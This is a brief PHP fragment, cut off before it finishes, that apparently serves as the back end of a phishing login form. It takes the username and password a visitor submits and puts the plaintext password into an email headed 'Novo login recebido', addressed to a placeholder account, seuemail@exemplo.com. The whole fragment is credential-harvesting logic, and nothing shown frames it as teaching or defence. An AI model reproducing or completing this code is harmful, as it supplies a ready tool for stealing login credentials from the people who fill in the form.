<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  $to = "seuemail@exemplo.com";
  $subject = "Novo login recebido";
  $message = "Nome de usuário: " . $username . "\n" . "Senha: " . $password;

  // Enviar o
